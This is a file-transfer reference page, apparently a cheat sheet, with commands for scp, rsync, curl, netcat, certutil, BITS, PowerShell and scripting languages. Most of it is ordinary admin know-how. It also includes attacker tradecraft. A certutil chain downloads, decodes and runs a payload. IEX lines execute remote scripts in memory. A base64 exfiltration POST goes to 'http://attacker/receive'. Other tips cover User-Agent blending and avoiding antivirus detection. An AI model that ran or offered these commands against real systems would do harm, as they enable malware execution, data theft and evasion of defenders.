---
title: File Transfer
description: File Transfer
icon: fontawesome/brands/docker
# status: new # deprecated
comments: true
# hide:
#     - navigation
#     - toc
---

## Table of Contents

1. [Quick Reference](#quick-reference)
2. [Linux — SCP](#linux--scp-secure-copy-protocol)
3. [Linux — SFTP](#linux--sftp)
4. [Linux — rsync](#linux--rsync)
5. [Linux — wget](#linux--wget)
6. [Linux — curl](#linux--curl)
7. [Linux — Netcat (nc)](#linux--netcat-nc)
8. [Linux — Python HTTP Server](#linux--python-http-server)
9. [Linux — FTP](#linux--ftp-client)
10. [Linux — Base64 Encoding](#linux--base64-encoding-transfer)
11. [Windows CMD — certutil](#windows-cmd--certutil)
12. [Windows CMD — bitsadmin](#windows-cmd--bitsadmin)
13. [Windows CMD — FTP](#windows-cmd--ftp)
14. [Windows CMD — xcopy / robocopy](#windows-cmd--xcopy--robocopy)
15. [Windows CMD — net use (SMB)](#windows-cmd--net-use-smb)
16. [PowerShell — Invoke-WebRequest / wget / curl](#powershell--invoke-webrequest)
17. [PowerShell — WebClient](#powershell--webclient)
18. [PowerShell — BITS (Start-BitsTransfer)](#powershell--bits-start-bitstransfer)
19. [PowerShell — SCP (OpenSSH)](#powershell--scp-openssh)
20. [PowerShell — SMB / PSDrive](#powershell--smb--psdrive)
21. [PowerShell — Base64 Encoding](#powershell--base64-encoding-transfer)
22. [PowerShell — Copy-Item (PS Remoting)](#powershell--copy-item-ps-remoting)
23. [Cross-Platform — SMB with Impacket](#cross-platform--smb-with-impacket-smbserver)
24. [Cross-Platform — Scripting Languages](#cross-platform--scripting-languages)
25. [Tips & Best Practices](#tips--best-practices)

---

## Quick Reference

| Tool            | Platform        | Protocol  | Encrypted | Notes                        |
|-----------------|-----------------|-----------|-----------|------------------------------|
| `scp`           | Linux/Win       | SSH       | ✅        | Simple, one-shot copy        |
| `sftp`          | Linux/Win       | SSH       | ✅        | Interactive, resumable       |
| `rsync`         | Linux           | SSH/rsync | ✅        | Delta sync, best for many files |
| `wget`          | Linux/Win       | HTTP/FTP  | ✅ (HTTPS)| Non-interactive download     |
| `curl`          | Linux/Win       | Multi     | ✅ (HTTPS)| Very flexible, upload+download|
| `nc` (netcat)   | Linux           | TCP/UDP   | ❌        | Raw transfer, no auth        |
| Python HTTP     | Linux/Win       | HTTP      | ❌        | Quick ad-hoc sharing         |
| `certutil`      | Windows CMD     | HTTP      | ✅ (HTTPS)| Built-in Windows utility     |
| `bitsadmin`     | Windows CMD     | HTTP/SMB  | ✅ (HTTPS)| Background transfers (deprecated in favor of BITS PS) |
| Invoke-WebRequest| PowerShell     | HTTP/S    | ✅        | Native PS download           |
| Start-BitsTransfer| PowerShell   | HTTP/SMB  | ✅        | Throttleable background DL   |
| SMB / net use   | Windows CMD     | SMB       | ✅*       | Network file share           |

---

## Linux — SCP (Secure Copy Protocol)

Operates over SSH (port 22). Simple, one-shot file copy.

```bash
# Upload local file to remote
scp /local/path/file.txt user@remote_host:/remote/path/

# Download file from remote
scp user@remote_host:/remote/path/file.txt /local/destination/

# Copy entire directory (recursive)
scp -r /local/dir/ user@remote_host:/remote/dir/

# Use non-default SSH port
scp -P 2222 file.txt user@remote_host:/remote/path/

# Use specific private key
scp -i ~/.ssh/id_rsa file.txt user@remote_host:/remote/path/

# Copy between two remote hosts
scp user1@host1:/path/file.txt user2@host2:/path/

# Compress during transfer
scp -C large_file.tar user@remote_host:/path/

# Limit bandwidth (KB/s)
scp -l 1024 file.txt user@remote_host:/path/

# Verbose mode
scp -v file.txt user@remote_host:/path/
```

> **Tip:** For transferring many small files, tar them first:
> `tar czf archive.tar.gz ./dir && scp archive.tar.gz user@host:/path/`

---

## Linux — SFTP

Interactive session over SSH. Supports resumable transfers and remote file management.

```bash
# Connect to remote host
sftp user@remote_host

# Connect on non-default port
sftp -oPort=2222 user@remote_host

# Use a specific private key
sftp -o IdentityFile=~/.ssh/id_rsa user@remote_host

# ── Inside the SFTP session ──────────────────────────────
sftp> pwd                      # Print remote working directory
sftp> lpwd                     # Print local working directory
sftp> ls                       # List remote files
sftp> lls                      # List local files
sftp> cd /remote/path          # Change remote directory
sftp> lcd /local/path          # Change local directory

sftp> put file.txt             # Upload local file to remote
sftp> put -r ./local_dir       # Upload directory recursively
sftp> get remote_file.txt      # Download file from remote
sftp> get -r remote_dir/       # Download directory recursively
sftp> mput *.txt               # Upload multiple files
sftp> mget *.log               # Download multiple files

sftp> mkdir new_dir            # Create remote directory
sftp> rmdir empty_dir          # Remove empty remote directory
sftp> rm remote_file.txt       # Delete remote file
sftp> rename old.txt new.txt   # Rename remote file
sftp> chmod 755 script.sh      # Change remote file permissions

sftp> !ls                      # Run local shell command without exiting
sftp> bye                      # Exit SFTP session
```

> **Tip:** Use `reget` to resume a failed download:
> `sftp> reget remote_file.txt`

---

## Linux — rsync

Best for large-scale, incremental, or repeated transfers. Sends only file differences (delta encoding).

```bash
# Basic sync local → remote
rsync -avz /local/dir/ user@remote_host:/remote/dir/

# Basic sync remote → local
rsync -avz user@remote_host:/remote/dir/ /local/dir/

# Key flags:
#   -a  archive mode (recursive + preserve permissions, timestamps, symlinks)
#   -v  verbose
#   -z  compress data during transfer
#   -P  show progress and allow resume (--partial --progress)
#   -n  dry run (simulate without transferring)
#   --delete  delete remote files that no longer exist locally

# Show progress
rsync -avzP /local/dir/ user@remote_host:/remote/dir/

# Dry run first (preview what will change)
rsync -avzn /local/dir/ user@remote_host:/remote/dir/

# Use non-default SSH port
rsync -avz -e "ssh -p 2222" /local/dir/ user@remote_host:/remote/dir/

# Use specific SSH key
rsync -avz -e "ssh -i ~/.ssh/id_rsa" /local/dir/ user@remote_host:/remote/dir/

# Mirror directory (delete files removed at source)
rsync -avz --delete /local/dir/ user@remote_host:/remote/dir/

# Exclude files/patterns
rsync -avz --exclude='*.log' --exclude='.git/' /local/dir/ user@remote_host:/remote/dir/

# Limit bandwidth (KB/s)
rsync --bwlimit=500 -avz /local/dir/ user@remote_host:/remote/dir/

# Backup (append timestamp suffix to changed files)
rsync -avz --backup --backup-dir=/backup/$(date +%Y%m%d) /local/dir/ /backup/current/
```

---

## Linux — wget

Non-interactive downloader. Great for scripting and cron jobs.

```bash
# Download file (save with original name)
wget http://example.com/file.zip

# Save with a different name
wget -O output.zip http://example.com/file.zip

# Download to specific directory
wget -P /tmp/ http://example.com/file.zip

# Resume interrupted download
wget -c http://example.com/large_file.iso

# Download in background
wget -b http://example.com/file.zip

# Limit download speed
wget --limit-rate=500k http://example.com/file.zip

# Download multiple files from a list
wget -i urls.txt

# Mirror a website
wget --mirror --convert-links --no-parent http://example.com/

# Skip SSL certificate check
wget --no-check-certificate https://example.com/file.zip

# Authenticate with HTTP basic auth
wget --user=username --password=secret http://example.com/private/file.zip

# Download via FTP
wget ftp://ftp.example.com/pub/file.tar.gz

# Retry on failure
wget --tries=5 http://example.com/file.zip

# Quiet mode (no output)
wget -q http://example.com/file.zip
```

---

## Linux — curl

Extremely versatile: supports HTTP, HTTPS, FTP, SFTP, SCP, SMB, and more.

```bash
# Download file (output to stdout — pipe or redirect)
curl http://example.com/file.txt

# Save with remote filename
curl -O http://example.com/file.zip

# Save with custom filename
curl -o myfile.zip http://example.com/file.zip

# Resume interrupted download
curl -C - -O http://example.com/large_file.iso

# Follow redirects
curl -L http://example.com/redirect

# Limit download speed
curl --limit-rate 500k -O http://example.com/file.zip

# Upload file with HTTP POST (multipart form)
curl -X POST -F "file=@/local/file.txt" http://example.com/upload

# Upload file with PUT
curl -T /local/file.txt http://example.com/upload/file.txt

# HTTP Basic authentication
curl -u username:password http://example.com/private/file.txt

# Send custom headers
curl -H "Authorization: Bearer TOKEN" http://example.com/api/file

# Skip SSL certificate verification
curl -k https://example.com/file.zip

# Download via FTP
curl -u user:pass ftp://ftp.example.com/file.tar.gz

# Upload to FTP
curl -T file.txt ftp://ftp.example.com/ -u user:pass

# Download via SCP
curl -u user: --key ~/.ssh/id_rsa --pubkey ~/.ssh/id_rsa.pub \
  scp://remote_host/path/to/file.txt -o file.txt

# Show download progress
curl --progress-bar -O http://example.com/file.zip

# Verbose output
curl -v http://example.com/file.txt
```

---

## Linux — Netcat (nc)

Raw TCP/UDP transfer. Fast but unencrypted — use only on trusted networks.

```bash
# ── Receiving end (listener) — run this FIRST ───────────
nc -lvp 4444 > received_file.txt

# ── Sending end ─────────────────────────────────────────
nc <receiver_ip> 4444 < file_to_send.txt

# ── Transfer a directory (tar on-the-fly) ───────────────
# Receiver:
nc -lvp 4444 | tar xzf -

# Sender:
tar czf - /path/to/dir | nc <receiver_ip> 4444

# ── Using /dev/tcp (no nc required on sender) ───────────
# Receiver:
nc -lvp 4444 > file.txt

# Sender (Bash built-in):
cat file.txt > /dev/tcp/<receiver_ip>/4444

# ── Using ncat (with SSL encryption) ────────────────────
# Receiver:
ncat -lvp 4444 --ssl > file.txt

# Sender:
ncat <receiver_ip> 4444 --ssl < file.txt
```

---

## Linux — Python HTTP Server

Quick ad-hoc HTTP file server — no install required.

```bash
# Python 3 — serve current directory on port 8080
python3 -m http.server 8080

# Python 3 — serve a specific directory
python3 -m http.server 8080 --directory /path/to/files

# Python 2 (legacy)
python2 -m SimpleHTTPServer 8080

# Python 3 with upload support (requires pip install uploadserver)
pip install uploadserver
python3 -m uploadserver 8080

# Download from the server on any machine:
wget http://<server_ip>:8080/file.txt
curl -O http://<server_ip>:8080/file.txt
```

> **Security:** The Python HTTP server has no authentication. Use only on isolated/trusted networks.

---

## Linux — FTP Client

```bash
# Connect to FTP server
ftp ftp.example.com

# Connect with specific port
ftp -p ftp.example.com 2121

# ── Inside FTP session ───────────────────────────────────
ftp> ls                        # List remote files
ftp> cd /remote/path           # Change remote directory
ftp> lcd /local/path           # Change local directory
ftp> get file.txt              # Download file
ftp> mget *.txt                # Download multiple files
ftp> put file.txt              # Upload file
ftp> mput *.txt                # Upload multiple files
ftp> binary                    # Switch to binary transfer mode
ftp> ascii                     # Switch to ASCII mode
ftp> passive                   # Toggle passive mode
ftp> bye                       # Disconnect

# Non-interactive download (one-liner)
ftp -n -v ftp.example.com << EOF
user username password
binary
get file.txt
bye
EOF
```

---

## Linux — Base64 Encoding Transfer

Useful when only text channels are available (e.g., terminal paste).

```bash
# Encode file to base64
base64 -w 0 file.bin > file.b64

# Decode on receiving end
base64 -d file.b64 > file.bin

# One-liner: encode, copy to clipboard (Linux)
base64 -w 0 file.bin | xclip -selection clipboard

# Verify integrity with md5sum
md5sum file.bin             # Before encoding
base64 -d file.b64 | md5sum # After decoding — should match
```

---

## Windows CMD — certutil

Built-in Windows binary. Primarily for certificates but widely used for downloads.

```cmd
REM Download a file
certutil -urlcache -f "http://192.168.1.100/file.txt" C:\Temp\file.txt

REM Download with split (large files)
certutil -urlcache -split -f "http://192.168.1.100/file.exe" C:\Temp\file.exe

REM Encode file to Base64
certutil -encode C:\Temp\file.exe C:\Temp\file.b64

REM Decode Base64 file
certutil -decode C:\Temp\file.b64 C:\Temp\file.exe

REM Download, decode, and run (chain)
certutil -urlcache -split -f http://server/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe && payload.exe

REM Verify file hash
certutil -hashfile C:\Temp\file.exe MD5
certutil -hashfile C:\Temp\file.exe SHA256
```

---

## Windows CMD — bitsadmin

Background Intelligent Transfer Service. Works over HTTP/S and SMB.

> **Note:** `bitsadmin` is deprecated in Windows 7+. Prefer `Start-BitsTransfer` in PowerShell.

```cmd
REM Download a file
bitsadmin /transfer myJob http://192.168.1.100/file.txt C:\Temp\file.txt

REM Download with normal priority
bitsadmin /transfer mydownload /download /priority normal http://server/file.exe C:\Temp\file.exe

REM Create a job, add a file, then start
bitsadmin /create myJob
bitsadmin /addfile myJob http://server/file.zip C:\Temp\file.zip
bitsadmin /resume myJob

REM Check job status
bitsadmin /info myJob /verbose

REM Complete the job after transfer
bitsadmin /complete myJob

REM Cancel a job
bitsadmin /cancel myJob
```

---

## Windows CMD — FTP

```cmd
REM Interactive FTP session
ftp ftp.example.com

REM Non-interactive using script file
REM Create a script file (ftp_script.txt):
REM   open ftp.example.com
REM   user username password
REM   binary
REM   get file.txt C:\Temp\file.txt
REM   bye

ftp -s:ftp_script.txt

REM Useful FTP commands inside the session:
REM   open <host>     Connect to server
REM   user <u> <p>    Authenticate
REM   binary          Binary mode
REM   get <file>      Download
REM   put <file>      Upload
REM   mget *.*        Download all files
REM   ls / dir        List files
REM   bye             Disconnect
```

---

## Windows CMD — xcopy / robocopy

For local, network share, and UNC path copies.

```cmd
REM xcopy — basic directory copy
xcopy C:\Source\*.* C:\Destination\ /E /I /H

REM xcopy flags:
REM   /E  copy subdirectories (including empty ones)
REM   /I  assume destination is directory
REM   /H  copy hidden files
REM   /Y  suppress overwrite confirmation

REM robocopy — robust copy (preferred)
robocopy C:\Source C:\Destination /E

REM Mirror source to destination (delete extras in destination)
robocopy C:\Source C:\Destination /MIR

REM Copy over network share
robocopy C:\Source \\RemoteHost\ShareName\Dest /E /Z /LOG:C:\Temp\log.txt

REM Retry on failure (5 retries, 10s wait)
robocopy C:\Source C:\Dest /E /R:5 /W:10

REM Useful robocopy flags:
REM   /E    copy all subdirectories
REM   /Z    copy files in restartable mode
REM   /MIR  mirror directory tree
REM   /MOV  move files (delete source after copy)
REM   /LOG  output log to file
REM   /MT:8 use 8 threads for multi-threaded copy
```

---

## Windows CMD — net use (SMB)

Map remote SMB/network shares.

```cmd
REM Mount a network share as a drive letter
net use Z: \\192.168.1.100\ShareName

REM Mount with credentials
net use Z: \\192.168.1.100\ShareName /user:username password

REM Mount with persistent reconnect
net use Z: \\192.168.1.100\ShareName /persistent:yes

REM List current mapped drives
net use

REM Disconnect a mapped drive
net use Z: /delete

REM Copy files from mounted share
copy Z:\file.txt C:\Temp\

REM Push into UNC path directly (no drive letter needed)
pushd \\192.168.1.100\ShareName
copy file.txt C:\Temp\
popd
```

---

## PowerShell — Invoke-WebRequest

Native PowerShell HTTP client. Aliases: `iwr`, `wget`, `curl`.

```powershell
# Download file to disk
Invoke-WebRequest -Uri "http://example.com/file.zip" -OutFile "C:\Temp\file.zip"

# Short alias form
iwr "http://example.com/file.zip" -OutFile "C:\Temp\file.zip"

# Skip certificate check (HTTPS with self-signed cert)
Invoke-WebRequest -Uri "https://192.168.1.100/file.zip" -OutFile "C:\Temp\file.zip" `
  -SkipCertificateCheck

# Use basic parsing (avoids IE dependency on older systems)
Invoke-WebRequest "http://example.com/file.exe" -OutFile "C:\Temp\file.exe" -UseBasicParsing

# Download with custom User-Agent (blend in as browser)
Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "C:\Temp\file.exe" `
  -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

# Upload file via POST (multipart form)
Invoke-WebRequest -Uri "http://example.com/upload" -Method POST `
  -InFile "C:\Temp\file.txt" -ContentType "multipart/form-data"

# Download and execute in memory (fileless)
IEX (Invoke-WebRequest "http://example.com/script.ps1" -UseBasicParsing)

# Pipe to IEX (alternative)
Invoke-WebRequest "http://example.com/script.ps1" | iex

# Handle proxy
Invoke-WebRequest -Uri "http://example.com/file.zip" -OutFile "C:\Temp\file.zip" `
  -Proxy "http://proxy.corp.com:8080" -ProxyUseDefaultCredentials
```

---

## PowerShell — WebClient

.NET WebClient class — faster than `Invoke-WebRequest` for large files.

```powershell
# Download file to disk
(New-Object System.Net.WebClient).DownloadFile("http://example.com/file.zip", "C:\Temp\file.zip")

# Short form in one line (CMD-compatible)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://example.com/file.zip','C:\Temp\file.zip')"

# Download string (execute script in memory)
IEX (New-Object Net.WebClient).DownloadString("http://example.com/script.ps1")

# Download binary data
$data = (New-Object System.Net.WebClient).DownloadData("http://example.com/binary.exe")

# Upload file via HTTP POST
(New-Object Net.WebClient).UploadFile("http://example.com/upload", "C:\Temp\file.txt")

# Upload to FTP
(New-Object Net.WebClient).UploadFile("ftp://ftp.example.com/file.txt", "C:\Temp\file.txt")

# Trust all SSL certificates (for self-signed)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object System.Net.WebClient).DownloadFile("https://192.168.1.100/file.zip", "C:\Temp\file.zip")

# With proxy and credentials
$wc = New-Object System.Net.WebClient
$wc.Proxy = New-Object System.Net.WebProxy("http://proxy:8080")
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.DownloadFile("http://example.com/file.zip", "C:\Temp\file.zip")
```

---

## PowerShell — BITS (Start-BitsTransfer)

Background Intelligent Transfer Service — throttleable, resumable, and proxy-aware.

```powershell
# Simple download
Start-BitsTransfer -Source "http://example.com/file.zip" -Destination "C:\Temp\file.zip"

# Old bitsadmin style via module
Import-Module bitstransfer
Start-BitsTransfer -Source "http://example.com/file.zip" -Destination "C:\Temp\file.zip"

# Upload
Start-BitsTransfer -Source "C:\Temp\report.zip" `
  -Destination "http://example.com/uploads/report.zip" -TransferType Upload

# Upload via proxy with credentials
Start-BitsTransfer -Source "C:\Temp\file.zip" `
  -Destination "http://example.com/uploads/file.zip" `
  -TransferType Upload `
  -ProxyUsage Override `
  -ProxyList "proxy.corp.com:8080" `
  -ProxyCredential (Get-Credential)

# Asynchronous (background) transfer
$job = Start-BitsTransfer -Source "http://example.com/big.iso" `
  -Destination "C:\Temp\big.iso" -Asynchronous

# Check job status
Get-BitsTransfer

# Complete async job
Complete-BitsTransfer -BitsJob $job

# Remove/cancel job
Remove-BitsTransfer -BitsJob $job
```

---

## PowerShell — SCP (OpenSSH)

Available natively on Windows 10 1809+ and Server 2019+.

```powershell
# Check if OpenSSH is installed
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

# Install OpenSSH client
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Upload file to Linux/remote host
scp C:\Temp\file.txt user@192.168.1.100:/remote/path/

# Download file from remote
scp user@192.168.1.100:/remote/path/file.txt C:\Temp\

# Upload directory recursively
scp -r C:\Temp\mydir\ user@192.168.1.100:/remote/

# Use non-default port
scp -P 2222 C:\Temp\file.txt user@192.168.1.100:/remote/path/

# Use private key
scp -i C:\Users\user\.ssh\id_rsa C:\Temp\file.txt user@192.168.1.100:/remote/
```

---

## PowerShell — SMB / PSDrive

Mount and interact with SMB shares via PowerShell.

```powershell
# Mount an SMB share as a PSDrive
New-PSDrive -Name "S" -PSProvider "FileSystem" -Root "\\192.168.1.100\ShareName"

# Mount with credentials
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('username', $pass)
New-PSDrive -Name "S" -PSProvider "FileSystem" -Root "\\192.168.1.100\ShareName" -Credential $cred

# Navigate and copy
cd S:
Copy-Item S:\file.txt C:\Temp\

# Copy to share
Copy-Item C:\Temp\file.txt S:\

# Remove the drive
Remove-PSDrive -Name "S"

# Direct UNC path copy (no mounting)
Copy-Item "\\192.168.1.100\ShareName\file.txt" "C:\Temp\"
```

---

## PowerShell — Base64 Encoding Transfer

Handy for sneaking files through text-only channels (copy-paste, echo, clipboard).

```powershell
# ── ENCODE (on source machine) ──────────────────────────

# Encode a file to Base64 string
$bytes = [System.IO.File]::ReadAllBytes("C:\Temp\file.exe")
$b64 = [Convert]::ToBase64String($bytes)
$b64 | Out-File "C:\Temp\file.b64"

# One-liner
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\file.exe")) | Set-Content "C:\Temp\file.b64"

# ── DECODE (on destination machine) ────────────────────

# Decode Base64 file back to binary
$b64 = Get-Content "C:\Temp\file.b64"
$bytes = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes("C:\Temp\file.exe", $bytes)

# ── UPLOAD encoded file via POST ───────────────────────
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\file.exe"))
Invoke-WebRequest -Uri "http://attacker/receive" -Method POST -Body $b64

# ── VERIFY integrity ───────────────────────────────────
Get-FileHash "C:\Temp\file.exe" -Algorithm MD5
Get-FileHash "C:\Temp\file.exe" -Algorithm SHA256
```

---

## PowerShell — Copy-Item (PS Remoting)

Transfer files over PowerShell Remoting (WS-Management / WinRM).

```powershell
# Enable WinRM (run as admin on target)
Enable-PSRemoting -Force

# Create a remote session
$session = New-PSSession -ComputerName "192.168.1.100" -Credential (Get-Credential)

# Copy local → remote
Copy-Item -Path "C:\Temp\file.txt" -Destination "C:\Users\Administrator\Desktop\" `
  -ToSession $session

# Copy remote → local
Copy-Item -Path "C:\Users\Administrator\Desktop\file.txt" -Destination "C:\Temp\" `
  -FromSession $session

# Copy directory recursively
Copy-Item -Path "C:\Temp\mydir" -Destination "C:\Temp\" `
  -ToSession $session -Recurse

# Remove the session when done
Remove-PSSession $session
```

---

## Cross-Platform — SMB with Impacket smbserver

Host a temporary SMB share from Linux (great for Linux→Windows transfers).

```bash
# Start SMB server (unauthenticated, current directory)
sudo impacket-smbserver ShareName $(pwd) -smb2support

# Start with authentication (required in newer Windows versions)
sudo impacket-smbserver ShareName $(pwd) -smb2support -user myuser -password mypass
```

```powershell
# On Windows — connect and copy (unauthenticated)
copy \\<linux_ip>\ShareName\file.txt C:\Temp\

# On Windows — connect with credentials
$pass = ConvertTo-SecureString 'mypass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('myuser', $pass)
New-PSDrive -Name "S" -PSProvider "FileSystem" -Root "\\<linux_ip>\ShareName" -Credential $cred
Copy-Item S:\file.txt C:\Temp\
```

---

## Cross-Platform — Scripting Languages

Use when dedicated tools are unavailable.

### Python

```bash
# Download with Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://example.com/file.txt", "file.txt")'

# Download with requests library
python3 -c 'import requests; open("file.txt","wb").write(requests.get("http://example.com/file.txt").content)'

# Upload via POST
python3 -c 'import requests; requests.post("http://server/upload", files={"file": open("file.txt","rb")})'
```

### PHP

```bash
# Download a file
php -r '$file = file_get_contents("http://example.com/file.txt"); file_put_contents("file.txt", $file);'

# Stream large file
php -r 'const BUF=4096; $r=fopen("http://example.com/big.bin","rb"); $w=fopen("big.bin","wb"); while($b=fread($r,BUF)){fwrite($w,$b);} fclose($r); fclose($w);'
```

### Ruby

```bash
# Download a file
ruby -e 'require "net/http"; File.write("file.txt", Net::HTTP.get(URI("http://example.com/file.txt")))'
```

### Perl

```bash
# Download a file
perl -e 'use LWP::Simple; getstore("http://example.com/file.txt", "file.txt");'
```

### JavaScript (Node.js)

```bash
# Download a file (Node.js)
node -e "const fs=require('fs'),https=require('https'); https.get('https://example.com/file.txt', r=>r.pipe(fs.createWriteStream('file.txt')))"
```

### PowerShell — WScript / VBScript (legacy Windows)

```vbscript
' Create wget.vbs, then run: cscript.exe /nologo wget.vbs http://example.com/file.exe file.exe
Dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
bStrm.type = 1
bStrm.open
bStrm.write xHttp.responseBody
bStrm.savetofile WScript.Arguments.Item(1), 2
```

```cmd
cscript.exe /nologo wget.vbs http://example.com/file.exe C:\Temp\file.exe
```

---

## Tips & Best Practices

### Compression Before Transfer

```bash
# Linux — tar + gzip before large transfers
tar czf archive.tar.gz /path/to/dir
scp archive.tar.gz user@remote:/path/
# On remote:
tar xzf archive.tar.gz
```

### SSH Config File (Simplify scp/sftp/rsync)

```ini
# ~/.ssh/config
Host myserver
    HostName 192.168.1.100
    User myuser
    Port 2222
    IdentityFile ~/.ssh/id_rsa
    ServerAliveInterval 60
```

```bash
# Now you can use:
scp file.txt myserver:/remote/path/
rsync -avz ./dir/ myserver:/remote/dir/
sftp myserver
```

### Verify File Integrity

```bash
# Linux
md5sum file.zip
sha256sum file.zip

# PowerShell
Get-FileHash C:\Temp\file.zip -Algorithm MD5
Get-FileHash C:\Temp\file.zip -Algorithm SHA256
```

### Security Reminders

| Concern               | Recommendation                                              |
|-----------------------|-------------------------------------------------------------|
| Unencrypted channels  | Avoid FTP, TFTP, plain HTTP on untrusted networks          |
| Firewall rules        | Ensure ports 22 (SSH), 445 (SMB), 21 (FTP) are allowed    |
| Permissions (Linux)   | Use `chmod` to restrict transferred file permissions        |
| Credentials in CMDs   | Avoid plaintext passwords; prefer SSH keys                  |
| AV detection (Windows)| Prefer BITS/Invoke-WebRequest over certutil for less noise  |
| Large transfers       | Use `rsync -z` or compress first; consider `--bwlimit`      |
| Resumable transfers   | Use `rsync -P`, `wget -c`, or `curl -C -` for large files  |

### Common Port Reference

| Protocol | Default Port | Notes                   |
|----------|-------------|-------------------------|
| SSH/SCP/SFTP | 22     | Encrypted               |
| FTP      | 21 (control) / 20 (data) | Unencrypted by default |
| FTPS     | 990          | FTP over TLS            |
| HTTP     | 80           | Unencrypted             |
| HTTPS    | 443          | TLS encrypted           |
| TFTP     | 69 (UDP)     | Unencrypted, no auth    |
| SMB      | 445          | Windows file sharing    |
| rsync    | 873          | Or tunneled over SSH    |
| WinRM    | 5985 (HTTP) / 5986 (HTTPS) | PS Remoting  |
